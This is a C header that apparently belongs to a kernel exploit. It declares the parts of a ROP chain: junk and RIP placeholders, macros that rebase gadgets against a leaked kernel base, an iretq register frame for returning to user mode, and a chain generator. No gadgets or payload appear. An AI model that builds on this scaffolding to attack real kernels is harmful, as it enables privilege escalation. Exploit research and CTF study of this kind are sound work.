#ifndef ROP_H
#define ROP_H

#include <stdint.h>
#include <stdbool.h>

#include "leaks.h"

#define ROP_JUNK 	0x4242424242424242UL
#define ROP_RIP 	0x1337133713371337UL
#define ROP_NEED_RB_K 	(1UL << 63)
#define ROP_NEED_RB_H 	(1UL << 62)
#define ROP_CL_FLAGS(x) (x & ~(ROP_NEED_RB_K | ROP_NEED_RB_H))
#define ROP_RB_K(x) 	(ROP_CL_FLAGS(x) + kernel_base)
#define ROP_RB_H(x) 	(ROP_CL_FLAGS(x) + rop_chain_base)

struct iretq_regs {
  uint64_t ip;
  uint64_t cs;
  uint64_t flags;
  uint64_t sp;
  uint64_t ss;
};

extern const uint64_t rop_chain[];

extern uint64_t* rop_chain_buf;

extern const uint32_t rop_chain_len;
extern const uint32_t min_rop_chain_len;
extern const uint32_t max_rop_chain_len;

// address of ROP chain
extern uint64_t rop_chain_base;

extern int rop_gen_chain(bool append_iretq_regs);

#endif // ROP_H
